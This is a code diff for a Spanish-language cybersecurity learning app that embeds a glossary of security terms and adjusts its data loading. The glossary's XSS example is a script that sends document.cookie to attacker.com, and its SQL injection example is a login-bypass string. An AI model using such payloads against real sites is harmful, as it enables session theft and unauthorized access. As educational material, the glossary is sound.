@@ -1,6 +1,26 @@
-/* CyberLab Application Entry Point, DataLoader & View Manager */
-
 window.CyberData = window.CyberData || {};
+window.CyberData.glossary = window.CyberData.glossary || [
+  { term: "TCP (Transmission Control Protocol)", simpleDef: "Protocolo de red que garantiza que los mensajes lleguen completos y en orden correcto a su destino.", techDef: "Protocolo de capa de transporte orientado a conexión que utiliza números de secuencia, reconocimientos (ACK) y control de flujo para asegurar entregas confiables.", example: "El tráfico web HTTPS o la transferencia de archivos por SSH utilizan TCP.", related: ["UDP", "IP", "Handshake"] },
+  { term: "UDP (User Datagram Protocol)", simpleDef: "Protocolo de red súper rápido que envía datos sin verificar si llegaron todos o en orden.", techDef: "Protocolo de capa de transporte no orientado a conexión y sin estado. Reduce la latencia al omitir handshakes o confirmaciones.", example: "Transmisión de video en vivo, llamadas VoIP y consultas DNS usan UDP.", related: ["TCP", "DNS", "Sockets"] },
+  { term: "DNS (Domain Name System)", simpleDef: "La libreta de direcciones de Internet que traduce nombres legibles (google.com) a direcciones IP numéricas.", techDef: "Sistema jerárquico y distribuido de bases de datos que resuelve nombres de dominio a direcciones IPv4/IPv6 mediante servidores raíz, TLD y autoritativos.", example: "Escribir 'cyberlab.edu' activa una consulta al puerto 53 para obtener la IP 192.168.1.50.", related: ["IP", "HTTP", "Envenenamiento DNS"] },
+  { term: "SIEM (Security Information and Event Management)", simpleDef: "Un centro de control centralizado que recolecta alertas de todos los equipos de la empresa para detectar ataques.", techDef: "Plataforma que centraliza, agrega y correlaciona logs de seguridad en tiempo real para generar alertas y permitir investigaciones forenses.", example: "Splunk, Microsoft Sentinel y Elastic SIEM son soluciones populares de SIEM.", related: ["SOC", "Logs", "MITRE ATT&CK"] },
+  { term: "EDR (Endpoint Detection and Response)", simpleDef: "Un antivirus avanzado instalado en las computadoras que monitorea constantemente comportamientos sospechosos.", techDef: "Agente de seguridad en host que combina monitoreo continuo de procesos, análisis de comportamiento y aislamiento remoto de endpoints comprometidos.", example: "CrowdStrike Falcon o Defender for Endpoint detectando la inyección de código en un proceso legítimo.", related: ["SIEM", "SOC", "Malware"] },
+  { term: "IOC (Indicator of Compromise)", simpleDef: "Una huella o pista digital que confirma que una computadora o red fue infectada.", techDef: "Artefacto forense (dirección IP maliciosa, hash de archivo, clave de registro) que demuestra la presencia de una intrusión con alto grado de certidumbre.", example: "El hash SHA-256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 pertenece a un ejecutable malicioso.", related: ["IOA", "Threat Intelligence", "Forense"] },
+  { term: "IOA (Indicator of Attack)", simpleDef: "Una señal en tiempo real que indica que un ataque está ocurriendo en este preciso instante.", techDef: "Indicador enfocado en la intención y comportamiento del adversario en tiempo real, independientemente de las herramientas o hashes utilizados.", example: "Intentos consecutivos de ejecución de comandos PowerShell codificados en Base64.", related: ["IOC", "TTP", "Detección"] },
+  { term: "TTP (Tactics, Techniques, and Procedures)", simpleDef: "El estilo de juego y metodología típica que utiliza un grupo de hackers para atacar.", techDef: "Descripción conceptual del comportamiento de las amenazas avanzadas (APTs), categorizadas en el marco de trabajo MITRE ATT&CK.", example: "El grupo APT29 utiliza Phishing (Táctica: Acceso Inicial) y PowerShell (Técnica: Ejecución).", related: ["MITRE ATT&CK", "Threat Intelligence"] },
+  { term: "XSS (Cross-Site Scripting)", simpleDef: "Vulnerabilidad web donde un atacante logra inyectar código JavaScript malicioso en una página para robar cookies de otros usuarios.", techDef: "Vulnerabilidad de aplicaciones web donde entradas no sanitizadas son renderizadas en el navegador de la víctima, ejecutando scripts arbitrarios.", example: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>", related: ["Seguridad Web", "CSRF", "OWASP"] },
+  { term: "CSRF (Cross-Site Request Forgery)", simpleDef: "Engañar al navegador de un usuario autenticado para que realice acciones involuntarias en un sitio de confianza.", techDef: "Ataque que fuerza a un cliente autenticado a enviar peticiones HTTP no deseadas hacia una aplicación web vulnerable aprovechando las cookies de sesión automáticas.", example: "Hacer clic en un enlace falso que envía una transferencia de dinero sin el consentimiento del usuario.", related: ["XSS", "Cookies", "Tokens"] },
+  { term: "SQLi (SQL Injection)", simpleDef: "Inyectar comandos de base de datos en un formulario para leer o alterar información confidencial.", techDef: "Inserción de fragmentos de código SQL en parámetros de entrada no validados que alteran la lógica de la consulta enviada a la base de datos.", example: "Ingresar ' OR '1'='1 en el campo de usuario para saltarse la autenticación.", related: ["Base de datos", "Prepared Statements", "OWASP"] },
+  { term: "CVE (Common Vulnerabilities and Exposures)", simpleDef: "Un identificador único internacional asignado a cada fallo de ciberseguridad conocido públicamente.", techDef: "Diccionario estandarizado de identificadores públicos asignados a vulnerabilidades de seguridad informáticas de software y hardware.", example: "CVE-2021-44228 es el identificador oficial de la vulnerabilidad crítica Log4Shell.", related: ["CVSS", "NVD", "Vulnerabilidad"] },
+  { term: "CVSS (Common Vulnerability Scoring System)", simpleDef: "El puntaje numérico del 0 al 10 que indica qué tan severa y peligrosa es una vulnerabilidad.", techDef: "Estándar abierto para evaluar la gravedad de las vulnerabilidades de seguridad informática según métricas base, temporales y ambientales.", example: "Log4Shell tiene una puntuación CVSSv3 de 10.0 (Crítica).", related: ["CVE", "Riesgo"] },
+  { term: "MITRE ATT&CK", simpleDef: "La enciclopedia global más famosa que organiza todas las formas conocidas en que los hackers atacan a las empresas.", techDef: "Matriz estructurada de conocimiento accesible globalmente sobre las tácticas y técnicas de los adversarios basadas en observaciones del mundo real.", example: "Revisar la matriz para entender cómo los atacantes realizan movimiento lateral dentro de un entorno Windows.", related: ["TTP", "SOC", "Blue Team"] },
+  { term: "SOC (Security Operations Center)", simpleDef: "El equipo y centro de operaciones encargado de vigilar las 24 horas del día las alertas de seguridad de una empresa.", techDef: "Unidad centralizada dentro de una organización encargada de monitorear, detectar, analizar y responder a incidentes de ciberseguridad continuamente.", example: "Los analistas Nivel 1 del SOC filtran alertas del SIEM y escalan incidentes a Nivel 2.", related: ["SIEM", "Incident Response", "EDR"] },
+  { term: "DFIR (Digital Forensics and Incident Response)", simpleDef: "Los detectives de la ciberseguridad que investigan qué ocurrió exactamente tras un ciberataque.", techDef: "Disciplina especializada que combina la recolección estricta de evidencia digital (Forense) con la contención y remediación de brechas (Respuesta a Incidentes).", example: "Extraer la memoria RAM de un servidor infectado para recuperar la clave de cifrado del ransomware.", related: ["Forense", "IOC", "Memoria"] },
+  { term: "OSINT (Open Source Intelligence)", simpleDef: "La recolección legal y ética de información pública disponible en Internet para investigar objetivos.", techDef: "Metodología de inteligencia que recopila, procesa y analiza datos accesibles públicamente en fuentes abiertas (redes sociales, registros DNS, motores de búsqueda).", example: "Utilizar Shodan o Google Dorking para descubrir servidores expuestos por error.", related: ["Reconocimiento", "Pentesting"] },
+  { term: "IAM (Identity and Access Management)", simpleDef: "El sistema que administra las identidades de los usuarios y asegura que solo accedan a lo que necesitan.", techDef: "Marco de políticas y tecnologías que garantiza que las personas adecuadas tengan el acceso apropiado a los recursos tecnológicos requeridos.", example: "AWS IAM gestionando roles, políticas y claves de acceso para recursos en la nube.", related: ["MFA", "Autenticación", "Principio de Mínimo Privilegio"] },
+  { term: "MFA (Multi-Factor Authentication)", simpleDef: "Requerir dos o más pruebas de identidad antes de permitir iniciar sesión (ej: contraseña + código al celular).", techDef: "Sistema de seguridad que requiere dos o más factores independientes de verificación: algo que sabes (contraseña), algo que tienes (token TOTP) o algo que eres (huella).", example: "Ingresar tu clave de usuario y validar la notificación en Google Authenticator.", related: ["IAM", "Autenticación"] },
+  { term: "Zero Trust (Confianza Cero)", simpleDef: "Filosofía de seguridad que asume que la red interna ya está infectada y verifica estrictamente cada petición.", techDef: "Modelo de seguridad basado en el principio 'Nunca confíes, siempre verifica'. Requiere autenticación y autorización continua de cada solicitud sin importar el origen de red.", example: "Exigir MFA y verificación del estado del dispositivo incluso si la computadora está conectada a la oficina física.", related: ["IAM", "Hardening", "Defensa en Profundidad"] }
+];
 
 class CyberLabApp {
   constructor() {
@@ -31,10 +51,6 @@ class CyberLabApp {
   }
 
   async loadAllDatasets() {
-    if (window.CyberData && Object.keys(window.CyberData).length > 0) {
-      console.log('✅ Datasets síncronos embebidos detectados:', Object.keys(window.CyberData));
-      return;
-    }
     const files = [
       'modules', 'quizzes', 'challenges', 'labs',
       'resources', 'glossary', 'tools', 'achievements',
@@ -43,11 +59,13 @@ class CyberLabApp {
 
     try {
       const responses = await Promise.all(files.map(f => fetch(`./data/${f}.json`)));
-      const jsons = await Promise.all(responses.map(r => r.ok ? r.json() : []));
+      const jsons = await Promise.all(responses.map(r => r.ok ? r.json() : null));
       
       window.CyberData = window.CyberData || {};
       files.forEach((f, index) => {
-        window.CyberData[f] = jsons[index] || [];
+        if (jsons[index] && Array.isArray(jsons[index]) && jsons[index].length > 0) {
+          window.CyberData[f] = jsons[index];
+        }
       });
       console.log('✅ Datasets cargados en paralelo:', Object.keys(window.CyberData));
     } catch (e) {
@@ -167,23 +185,9 @@ class CyberLabApp {
     if (!container) return;
     const account = window.CyberAccounts?.getActive();
     const aiGlossary = window.CyberStorage?.data?.aiGlossary || [];
-
-    // ALWAYS force-load official glossary if not present
-    if (!window.CyberData?.glossary || window.CyberData.glossary.length === 0) {
-      container.innerHTML = '<div class="card" style="padding:24px;text-align:center;color:var(--text-muted);">⏳ Cargando glosario...</div>';
-      fetch('./data/glossary.json').then(r => r.json()).then(data => {
-        window.CyberData = window.CyberData || {};
-        window.CyberData.glossary = Array.isArray(data) ? data : [];
-        console.log('📖 Glossary loaded:', window.CyberData.glossary.length, 'terms');
-        this.renderGlossary(filterMode, searchQuery);
-      }).catch(e => {
-        console.error('Error fetching glossary:', e);
-        container.innerHTML = '<div class="card" style="padding:24px;text-align:center;color:#ff6b6b;">❌ Error al cargar el glosario. Intenta recargar la página.</div>';
-      });
-      return; // Exit here, re-render will be triggered by the fetch callback
-    }
-
-    let officialGlossary = window.CyberData.glossary;
+    const officialGlossary = (window.CyberData && Array.isArray(window.CyberData.glossary) && window.CyberData.glossary.length > 0) 
+      ? window.CyberData.glossary 
+      : [];
     
     let combinedGlossary = [...aiGlossary, ...officialGlossary];
 
